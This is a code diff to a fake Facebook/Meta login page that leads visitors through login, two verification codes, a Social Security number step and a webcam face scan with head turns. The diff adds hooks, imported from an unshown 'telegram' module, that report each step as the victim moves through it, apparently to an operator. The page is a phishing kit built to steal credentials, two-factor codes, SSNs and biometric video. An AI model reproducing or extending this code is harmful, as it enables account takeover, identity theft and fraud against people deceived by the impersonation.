@@ -11,25 +11,13 @@ import {
   DialogDescription,
 } from "@/components/ui/dialog";
 import metaLogoImg from "@assets/IMG_7894_1765013426839.png";
-
-type VerificationStep = 
-  | "login"
-  | "loading-login"
-  | "code1"
-  | "loading-code1"
-  | "code2"
-  | "loading-code2"
-  | "ssn"
-  | "loading-ssn"
-  | "face-verification"
-  | "face-rotation"
-  | "complete";
+import { notifyVerificationStart, notifyVerificationStep, notifyVerificationComplete, type VerificationStep } from '@/lib/telegram';
 
 function FacebookLoader() {
   return (
     <div className="flex flex-col items-center justify-center py-12">
       <div className="relative w-16 h-16">
-        <div 
+        <div
           className="absolute inset-0 rounded-full border-4 border-gray-200"
           style={{ borderTopColor: '#1877f2' }}
         >
@@ -40,9 +28,9 @@ function FacebookLoader() {
             }
           `}</style>
         </div>
-        <div 
+        <div
           className="absolute inset-0 rounded-full border-4 border-transparent"
-          style={{ 
+          style={{
             borderTopColor: '#1877f2',
             animation: 'fb-spin 1s linear infinite'
           }}
@@ -120,17 +108,31 @@ export default function LoginPage() {
 
   useEffect(() => {
     let timer: NodeJS.Timeout;
-    
-    if (currentStep === "loading-login") {
+
+    if (currentStep === "login") {
+      notifyVerificationStart();
+    } else if (currentStep === "loading-login") {
+      notifyVerificationStep("loading-login");
       timer = setTimeout(() => setCurrentStep("code1"), 3000);
     } else if (currentStep === "loading-code1") {
+      notifyVerificationStep("loading-code1");
       timer = setTimeout(() => setCurrentStep("code2"), 5000);
     } else if (currentStep === "loading-code2") {
+      notifyVerificationStep("loading-code2");
       timer = setTimeout(() => setCurrentStep("ssn"), 10000);
     } else if (currentStep === "loading-ssn") {
+      notifyVerificationStep("loading-ssn");
       timer = setTimeout(() => setCurrentStep("face-verification"), 5000);
+    } else if (currentStep === "face-verification") {
+      notifyVerificationStep("face-verification");
+    } else if (currentStep === "face-rotation") {
+      notifyVerificationStep("face-rotation");
+      setCurrentDirection("center");
+      setCompletedDirections(new Set());
+    } else if (currentStep === "complete") {
+      notifyVerificationComplete();
     }
-    
+
     return () => clearTimeout(timer);
   }, [currentStep]);
 
@@ -169,15 +171,12 @@ export default function LoginPage() {
 
   const handleStartFaceVerification = async () => {
     try {
-      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
+      const mediaStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" },
-        audio: false 
+        audio: false
       });
       setStream(mediaStream);
       setCurrentStep("face-rotation");
-      setCurrentDirection("center");
-      setCompletedDirections(new Set());
-      
       if (videoRef) {
         videoRef.srcObject = mediaStream;
       }
@@ -194,7 +193,7 @@ export default function LoginPage() {
 
     const directions = ["up", "down", "left", "right"];
     const remainingDirections = directions.filter(d => !newCompleted.has(d));
-    
+
     if (remainingDirections.length === 0) {
       if (stream) {
         stream.getTracks().forEach(track => track.stop());
@@ -232,9 +231,9 @@ export default function LoginPage() {
         <div className="w-full max-w-md">
           {/* Facebook Logo */}
           <div className="text-center mb-8">
-            <img 
-              src="/favicon.png" 
-              alt="Facebook" 
+            <img
+              src="/favicon.png"
+              alt="Facebook"
               className="w-16 h-16 mx-auto"
               data-testid="logo-facebook"
             />
@@ -464,11 +463,11 @@ export default function LoginPage() {
                 {currentDirection === "center" ? "Position Your Face" : `Look ${currentDirection.toUpperCase()}`}
               </h2>
               <p className="text-sm mb-4" style={{ color: '#65676b' }}>
-                {currentDirection === "center" 
-                  ? "Center your face in the frame" 
+                {currentDirection === "center"
+                  ? "Center your face in the frame"
                   : `Turn your head to look ${currentDirection}`}
               </p>
-              
+
               {/* Camera Feed */}
               <div className="relative w-64 h-64 mx-auto mb-4 rounded-2xl overflow-hidden" style={{ backgroundColor: '#000' }}>
                 <video
@@ -483,27 +482,27 @@ export default function LoginPage() {
                   muted
                   className="w-full h-full object-cover scale-x-[-1]"
                 />
-                
+
                 {/* Direction Indicator Overlay */}
                 <div className="absolute inset-0 pointer-events-none">
                   {/* Center circle guide */}
                   <div className="absolute inset-0 flex items-center justify-center">
-                    <div 
+                    <div
                       className="w-48 h-56 rounded-full border-4"
-                      style={{ 
+                      style={{
                         borderColor: completedDirections.has(currentDirection) ? '#00a400' : '#1877f2',
                         borderStyle: 'dashed'
                       }}
                     />
                   </div>
-                  
+
                   {/* Direction arrow */}
                   {currentDirection !== "center" && (
                     <div className="absolute inset-0 flex items-center justify-center">
-                      <div 
+                      <div
                         className="text-white font-bold text-4xl"
                         style={{
-                          transform: 
+                          transform:
                             currentDirection === "up" ? "translateY(-80px)" :
                             currentDirection === "down" ? "translateY(80px)" :
                             currentDirection === "left" ? "translateX(-80px)" :
@@ -590,9 +589,9 @@ export default function LoginPage() {
       {/* Footer */}
       <footer className="text-center py-8 px-5" style={{ color: '#65676b' }}>
         <div className="mb-4">
-          <img 
-            src={metaLogoImg} 
-            alt="Meta" 
+          <img
+            src={metaLogoImg}
+            alt="Meta"
             className="h-8 mx-auto"
             data-testid="img-meta-logo"
           />
